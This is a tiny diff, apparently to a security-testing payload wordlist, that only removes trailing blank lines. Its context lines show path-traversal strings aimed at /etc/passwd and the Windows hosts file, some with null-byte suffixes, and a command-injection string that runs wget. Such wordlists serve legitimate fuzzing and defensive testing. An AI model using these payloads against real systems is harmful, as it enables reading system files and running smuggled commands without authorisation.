@@ -36,7 +36,3 @@ $(/bin/wget <HOME>)
 ../../../../../etc/passwd%00
 ..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts
 ..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts%00
-
-
-
-
